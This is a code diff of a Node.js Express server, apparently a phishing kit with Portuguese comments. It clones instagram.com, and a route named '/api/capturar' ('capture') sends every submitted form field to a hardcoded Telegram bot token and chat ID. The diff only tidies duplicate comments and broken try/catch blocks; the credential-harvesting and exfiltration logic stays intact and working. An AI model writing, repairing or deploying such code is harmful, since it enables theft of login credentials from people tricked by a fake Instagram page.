@@ -6,8 +6,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Configurações
-// Configurações
-const TARGET_URL = 'https://www.instagram.com'; // URL da página que quer clonar
+const TARGET_URL = 'https://www.instagram.com';
 const TELEGRAM_BOT_TOKEN = '8209450971:AAFt1mshdZ9xdXS8rB-263mOAUoC5Fy5XJs';
 const TELEGRAM_CHAT_ID = '1004251154302';
 
@@ -23,20 +22,16 @@ app.post('/api/capturar', async (req, res) => {
         mensagem += `*${chave}*: ${valor}\n`;
     }
 
- try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: 1004251154302,
+                chat_id: TELEGRAM_CHAT_ID,
                 text: mensagem,
                 parse_mode: 'Markdown'
             })
         });
-    } catch (e) {
-        console.error("Erro ao enviar mensagem:", e);
-    }
-    } catch (e) {
     } catch (e) {
         console.error("Erro ao enviar mensagem:", e);
     }
